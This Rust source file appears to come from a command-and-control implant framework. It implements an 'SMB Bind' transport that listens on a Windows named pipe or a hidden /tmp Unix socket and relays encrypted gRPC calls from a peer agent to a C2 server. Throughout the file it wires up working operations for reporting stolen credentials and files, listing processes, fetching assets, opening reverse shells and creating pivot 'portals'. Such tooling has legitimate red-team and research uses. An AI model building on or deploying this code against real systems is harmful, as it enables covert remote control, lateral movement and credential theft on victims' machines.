use crate::Transport;
use anyhow::{anyhow, Result};
use pb::c2::*;
use pb::config::Config;
use std::sync::mpsc::{Receiver, Sender};
use std::sync::Arc;
use tonic::GrpcMethod;
use tonic::Request;

// SMB Bind uses named pipes (Windows) or Unix domain sockets (non-Windows) as a
// local trusted channel.  Like TCP Bind, no extra encryption is applied here;
// ChaCha encryption is applied by Agent A when forwarding upstream to Tavern.
//
// URI format: smb://<pipe-name>
//   Windows:     binds \\.\pipe\<pipe-name>
//   Linux/macOS: binds /tmp/.<pipe-name>.sock

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";

// ── Windows named-pipe cache ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
static SMB_BIND_CACHE: std::sync::OnceLock<(
    String, // pipe path  (\\.\pipe\<name>)
    Arc<tokio::sync::Mutex<tokio::net::windows::named_pipe::NamedPipeServer>>,
    tonic::client::Grpc<tonic::transport::Channel>,
)> = std::sync::OnceLock::new();

// ── Unix-socket cache (Linux / macOS) ────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
static SMB_BIND_CACHE: std::sync::OnceLock<(
    String, // socket path  (/tmp/.<name>.sock)
    Arc<tokio::sync::Mutex<tokio_stream::wrappers::UnixListenerStream>>,
    tonic::client::Grpc<tonic::transport::Channel>,
)> = std::sync::OnceLock::new();

// ─────────────────────────────────────────────────────────────────────────────

#[derive(Clone)]
pub struct SmbBindTransport {
    grpc: Option<tonic::client::Grpc<tonic::transport::Channel>>,
}

#[async_trait::async_trait]
impl Transport for SmbBindTransport {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
        Box::new(self.clone())
    }

    fn init() -> Self {
        SmbBindTransport { grpc: None }
    }

    fn new(config: Config) -> Result<Self> {
        let uri = config
            .info
            .as_ref()
            .and_then(|info| info.available_transports.as_ref())
            .and_then(|at| {
                let active_idx = at.active_index as usize;
                at.transports
                    .get(active_idx)
                    .or_else(|| at.transports.first())
            })
            .map(|t| t.uri.clone())
            .ok_or_else(|| anyhow!("No transports configured"))?;

        let pipe_name = if uri.starts_with("smb://") {
            uri.strip_prefix("smb://")
                .unwrap()
                .trim_end_matches('/')
                .to_string()
        } else {
            return Err(anyhow!(
                "Invalid scheme for SMB Bind transport (expected smb://): {}",
                uri
            ));
        };

        #[cfg(debug_assertions)]
        log::info!("[smb-bind] new() with pipe name: {}", pipe_name);

        #[cfg(target_os = "windows")]
        return Self::new_windows(pipe_name);

        #[cfg(not(target_os = "windows"))]
        return Self::new_unix(pipe_name);
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        #[cfg(debug_assertions)]
        log::debug!("[smb-bind] claim_tasks()");
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        loop {
            match stream.message().await {
                Ok(Some(msg)) => {
                    if tx.send(msg).is_err() {
                        break;
                    }
                }
                Ok(None) => break,
                Err(_) => break,
            }
        }
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_output(
        &mut self,
        request: ReportOutputRequest,
    ) -> Result<ReportOutputResponse> {
        #[cfg(debug_assertions)]
        log::debug!("[smb-bind] report_output()");
        let resp = self.report_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_) => None,
            } {
                if tx.send(msg).await.is_err() {
                    return;
                }
            }
        });

        Ok(())
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
        let resp = self.create_portal_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_) => None,
            } {
                if tx.send(msg).await.is_err() {
                    return;
                }
            }
        });

        Ok(())
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportSmbBind
    }

    fn is_active(&self) -> bool {
        self.grpc.is_some()
    }

    fn name(&self) -> &'static str {
        "smb-bind"
    }

    async fn forward_raw(
        &mut self,
        _path: String,
        _rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        _tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        Err(anyhow!(
            "SMB Bind transport raw forwarding not implemented yet"
        ))
    }

    fn list_available(&self) -> Vec<String> {
        vec!["smb-bind".to_string()]
    }
}

// ── Platform-specific constructors ───────────────────────────────────────────

impl SmbBindTransport {
    /// Windows: bind a named pipe at `\\.\pipe\<name>`, wait for Agent A.
    #[cfg(target_os = "windows")]
    fn new_windows(pipe_name: String) -> Result<Self> {
        use tokio::net::windows::named_pipe::ServerOptions;

        let pipe_path = format!(r"\\.\pipe\{}", pipe_name);

        if let Some((cached_path, _server, cached_grpc)) = SMB_BIND_CACHE.get() {
            if cached_path == &pipe_path {
                #[cfg(debug_assertions)]
                log::debug!("[smb-bind] reusing cached gRPC channel for {}", pipe_path);
                return Ok(Self {
                    grpc: Some(cached_grpc.clone()),
                });
            } else {
                return Err(anyhow!(
                    "SmbBindTransport pipe changed from {} to {} — restart required",
                    cached_path,
                    pipe_path
                ));
            }
        }

        #[cfg(debug_assertions)]
        log::info!(
            "[smb-bind] creating named pipe server at {} — waiting for Agent A",
            pipe_path
        );

        let server = ServerOptions::new()
            .first_pipe_instance(true)
            .create(&pipe_path)?;
        let server = Arc::new(tokio::sync::Mutex::new(server));

        let endpoint = tonic::transport::Endpoint::try_from("http://[::]:50051")?;
        let server_for_connector = server.clone();
        let pipe_path_for_connector = pipe_path.clone();
        let channel = endpoint.connect_with_connector_lazy(tower::service_fn(
            move |_uri: tonic::transport::Uri| {
                let server_clone = server_for_connector.clone();
                let pipe_path_clone = pipe_path_for_connector.clone();
                async move {
                    #[cfg(debug_assertions)]
                    log::debug!("[smb-bind] connector: waiting for named pipe connection...");
                    let mut guard = server_clone.lock().await;
                    guard.connect().await.map_err(|e| {
                        std::io::Error::new(std::io::ErrorKind::Other, e.to_string())
                    })?;
                    // Swap the now-connected server with a fresh one ready for the next caller.
                    let connected = std::mem::replace(
                        &mut *guard,
                        ServerOptions::new().create(&pipe_path_clone).map_err(|e| {
                            std::io::Error::new(std::io::ErrorKind::Other, e.to_string())
                        })?,
                    );
                    #[cfg(debug_assertions)]
                    log::info!("[smb-bind] connector: accepted named pipe connection from Agent A");
                    Ok(hyper_util::rt::TokioIo::new(connected))
                }
            },
        ));

        let grpc = tonic::client::Grpc::new(channel);
        #[cfg(debug_assertions)]
        log::info!("[smb-bind] gRPC channel created, transport ready");

        let _ = SMB_BIND_CACHE.set((pipe_path, server, grpc.clone()));
        Ok(Self { grpc: Some(grpc) })
    }

    /// Linux/macOS: bind a Unix domain socket at `/tmp/.<name>.sock`, wait for Agent A.
    #[cfg(not(target_os = "windows"))]
    fn new_unix(pipe_name: String) -> Result<Self> {
        use tokio::net::UnixListener;
        use tokio_stream::wrappers::UnixListenerStream;

        let socket_path = format!("/tmp/.{}.sock", pipe_name);

        if let Some((cached_path, _stream, cached_grpc)) = SMB_BIND_CACHE.get() {
            if cached_path == &socket_path {
                #[cfg(debug_assertions)]
                log::debug!("[smb-bind] reusing cached gRPC channel for {}", socket_path);
                return Ok(Self {
                    grpc: Some(cached_grpc.clone()),
                });
            } else {
                return Err(anyhow!(
                    "SmbBindTransport socket changed from {} to {} — restart required",
                    cached_path,
                    socket_path
                ));
            }
        }

        // Remove stale socket file from a previous run.
        let _ = std::fs::remove_file(&socket_path);

        #[cfg(debug_assertions)]
        log::info!(
            "[smb-bind] binding Unix socket at {} — waiting for Agent A",
            socket_path
        );

        let listener = UnixListener::bind(&socket_path)?;
        let stream = Arc::new(tokio::sync::Mutex::new(UnixListenerStream::new(listener)));

        let endpoint = tonic::transport::Endpoint::try_from("http://[::]:50051")?;
        let stream_for_connector = stream.clone();
        let channel = endpoint.connect_with_connector_lazy(tower::service_fn(
            move |_uri: tonic::transport::Uri| {
                let stream_clone = stream_for_connector.clone();
                async move {
                    use tokio_stream::StreamExt;
                    #[cfg(debug_assertions)]
                    log::debug!("[smb-bind] connector: waiting for next Unix socket connection...");
                    let mut guard = stream_clone.lock().await;
                    if let Some(conn) = guard.next().await {
                        match conn {
                            Ok(c) => {
                                #[cfg(debug_assertions)]
                                log::info!(
                                    "[smb-bind] connector: accepted Unix socket connection from Agent A"
                                );
                                Ok(hyper_util::rt::TokioIo::new(c))
                            }
                            Err(e) => {
                                #[cfg(debug_assertions)]
                                log::error!("[smb-bind] connector: accept error: {}", e);
                                Err(std::io::Error::new(
                                    std::io::ErrorKind::Other,
                                    e.to_string(),
                                ))
                            }
                        }
                    } else {
                        #[cfg(debug_assertions)]
                        log::error!("[smb-bind] connector: Unix socket listener stream closed");
                        Err(std::io::Error::new(
                            std::io::ErrorKind::BrokenPipe,
                            "Unix socket listener closed",
                        ))
                    }
                }
            },
        ));

        let grpc = tonic::client::Grpc::new(channel);
        #[cfg(debug_assertions)]
        log::info!("[smb-bind] gRPC channel created, transport ready");

        let _ = SMB_BIND_CACHE.set((socket_path, stream, grpc.clone()));
        Ok(Self { grpc: Some(grpc) })
    }

    // ── gRPC helpers ─────────────────────────────────────────────────────────

    async fn check_ready(&mut self) -> Result<(), tonic::Status> {
        if self.grpc.is_none() {
            return Err(tonic::Status::new(
                tonic::Code::FailedPrecondition,
                "grpc client not created".to_string(),
            ));
        }
        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        Ok(())
    }

    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc
            .as_mut()
            .unwrap()
            .server_streaming(req, path, codec)
            .await
    }

    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path =
            tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc
            .as_mut()
            .unwrap()
            .client_streaming(req, path, codec)
            .await
    }

    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path =
            tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    pub async fn report_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportOutputResponse>, tonic::Status> {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
        self.grpc.as_mut().unwrap().unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }

    async fn create_portal_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = CreatePortalRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<CreatePortalResponse>>,
        tonic::Status,
    > {
        self.check_ready().await?;
        let codec = pb::xchacha::ChachaCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CREATE_PORTAL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "CreatePortal"));
        self.grpc
            .as_mut()
            .unwrap()
            .streaming(req, path, codec)
            .await
    }
}
